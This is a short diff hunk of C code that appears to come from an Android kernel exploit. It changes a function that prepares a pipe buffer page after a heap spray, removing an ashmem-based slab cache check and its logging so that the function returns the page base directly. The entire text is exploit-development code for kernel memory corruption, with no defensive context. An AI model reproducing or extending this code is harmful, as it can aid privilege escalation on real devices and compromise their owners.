@@ -525,26 +525,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     }
   }
 
-  pipebuf_page_base = base;
-  int gfd = open_ashmem_device();
-  if (gfd < 0) {
-    pr_warning("pipe prepare cache gate alias unavailable errno=%d\n", errno);
-  } else if (pipe_reclaim_cache_gate(gfd)) {
-    pr_success("pipe prepare cache ok slab=%016zx page=%016zx\n",
-               candidate_slab_cache, pipebuf_page_base);
-    close(gfd);
-  } else {
-    pr_warning("pipe prepare cache rejected slab=%016zx want=%016zx hit=%d\n",
-               candidate_slab_cache, kmalloc_pipe_cache,
-               pipe_cache_slot_hit);
-    close(gfd);
-    pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
-    return 0;
-  }
-
-  uintptr_t page = pipebuf_page_base;
   pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
-  return page;
+  return base;
 }
 
 /* ================= exit-path protection (fixwave 2026-10) =================
